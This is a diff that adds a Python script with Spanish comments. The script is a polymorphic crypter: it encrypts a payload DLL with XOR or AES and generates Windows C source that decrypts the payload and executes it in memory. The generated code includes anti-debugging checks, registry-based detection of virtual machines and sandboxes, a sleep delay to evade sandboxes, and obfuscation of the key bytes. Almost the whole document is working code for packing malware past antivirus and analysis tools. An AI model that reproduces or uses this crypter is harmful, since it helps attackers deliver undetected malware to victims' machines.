@@ -1,0 +1,193 @@
+cat > polymorphic_crypter.py << 'EOF'
+import random
+import string
+import os
+import sys
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import base64
+
+class PolymorphicCrypter:
+    def __init__(self, payload_path):
+        try:
+            with open(payload_path, 'rb') as f:
+                self.payload = f.read()
+            self.key = os.urandom(32)
+            self.iv = os.urandom(16)
+            print(f"[+] Payload cargado: {len(self.payload)} bytes")
+        except FileNotFoundError:
+            print(f"[-] Error: No se encuentra el archivo {payload_path}")
+            sys.exit(1)
+    
+    def generate_decoder_stub(self):
+        """Genera un stub de decodificación único cada vez"""
+        # Técnicas de ofuscación aleatorias
+        techniques = [
+            self._xor_decoder,
+            self._aes_decoder
+        ]
+        return random.choice(techniques)()
+    
+    def _xor_decoder(self):
+        """Stub con XOR"""
+        xor_key = random.randint(1, 255)
+        encoded = bytes([b ^ xor_key for b in self.payload])
+        
+        stub = f'''
+void DecodeAndExecute() {{
+    unsigned char encoded[] = {{{','.join(map(str, encoded))}}};
+    unsigned char key = {xor_key};
+    
+    for(int i = 0; i < sizeof(encoded); i++) {{
+        encoded[i] ^= key;
+    }}
+    
+    // Ejecutar código decodificado
+    ((void(*)())encoded)();
+}}
+'''
+        return stub
+    
+    def _aes_decoder(self):
+        """Stub con AES"""
+        try:
+            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
+            # Asegurar que el payload tenga el tamaño correcto para AES
+            padded_payload = pad(self.payload, AES.block_size)
+            encrypted = cipher.encrypt(padded_payload)
+        except Exception as e:
+            print(f"[-] Error en AES: {e}")
+            return self._xor_decoder()  # Fallback a XOR
+        
+        # Ofuscar clave e IV en el stub
+        key_obf = self._obfuscate_bytes(self.key)
+        iv_obf = self._obfuscate_bytes(self.iv)
+        
+        stub = f'''
+#include <windows.h>
+#include <wincrypt.h>
+
+void DecodeAndExecute() {{
+    unsigned char encrypted[] = {{{','.join(map(str, encrypted))}}};
+    unsigned char key[] = {{{key_obf}}};
+    unsigned char iv[] = {{{iv_obf}}};
+    HCRYPTPROV hProv;
+    HCRYPTHASH hHash;
+    HCRYPTKEY hKey;
+    
+    if(!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
+        return;
+    }}
+    
+    if(!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
+        CryptReleaseContext(hProv, 0);
+        return;
+    }}
+    
+    CryptHashData(hHash, key, sizeof(key), 0);
+    
+    if(!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {{
+        CryptDestroyHash(hHash);
+        CryptReleaseContext(hProv, 0);
+        return;
+    }}
+    
+    DWORD encrypted_len = sizeof(encrypted);
+    if(!CryptDecrypt(hKey, 0, TRUE, 0, encrypted, &encrypted_len)) {{
+        CryptDestroyKey(hKey);
+        CryptDestroyHash(hHash);
+        CryptReleaseContext(hProv, 0);
+        return;
+    }}
+    
+    // Ejecutar payload decodificado
+    void (*exec)() = (void(*)())encrypted;
+    exec();
+}}
+'''
+        return stub
+    
+    def _obfuscate_bytes(self, data):
+        """Ofusca bytes con operaciones matemáticas"""
+        parts = []
+        for b in data:
+            # Dividir cada byte en suma de dos números
+            a = random.randint(1, b-1) if b > 1 else 0
+            b_rest = b - a
+            parts.append(f"({a}+{b_rest})")
+        return ','.join(parts)
+    
+    def generate_final_payload(self):
+        """Genera el payload final polimórfico"""
+        stub = self.generate_decoder_stub()
+        
+        # Añadir código anti-debug y anti-sandbox
+        anti_debug = '''
+BOOL IsSandboxed() {
+    // Detectar depuración
+    if (IsDebuggerPresent()) return TRUE;
+    
+    // Detectar análisis en VM (simplificado)
+    HKEY hKey;
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
+        "SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum", 
+        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        char value[256];
+        DWORD size = sizeof(value);
+        if (RegQueryValueEx(hKey, "0", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
+            if (strstr(value, "VBOX") || strstr(value, "VMWARE") || 
+                strstr(value, "QEMU") || strstr(value, "VIRTUAL")) {
+                RegCloseKey(hKey);
+                return TRUE;
+            }
+        }
+        RegCloseKey(hKey);
+    }
+    return FALSE;
+}
+'''
+        
+        final_code = f'''
+#include <windows.h>
+#include <winreg.h>
+#include <stdio.h>
+
+{anti_debug}
+
+{stub}
+
+int main() {{
+    if (IsSandboxed()) return 1;
+    
+    // Técnica de "sleep evasion"
+    Sleep(10000);  // Esperar 10 segundos para evadir sandboxes
+    
+    DecodeAndExecute();
+    return 0;
+}}
+'''
+        return final_code
+
+if __name__ == "__main__":
+    # Verificar que existe payload.dll
+    if not os.path.exists('payload.dll'):
+        print("[-] Error: No se encuentra payload.dll")
+        print("[*] Primero compila la DLL con:")
+        print("    x86_64-w64-mingw32-gcc -shared -o payload.dll dll_main.c -Os -s")
+        sys.exit(1)
+    
+    print("[*] Creando crypter polimórfico...")
+    crypter = PolymorphicCrypter('payload.dll')
+    payload_code = crypter.generate_final_payload()
+    
+    with open('final_payload.c', 'w') as f:
+        f.write(payload_code)
+    
+    print("[+] Payload polimórfico generado en final_payload.c")
+    print(f"[+] Tamaño del código: {len(payload_code)} bytes")
+    
+    # Mostrar una vista previa
+    print("\n[*] Vista previa del código generado:")
+    print("-" * 50)
+    print(payload_code[:500] + "...")
+    print("-" * 50)
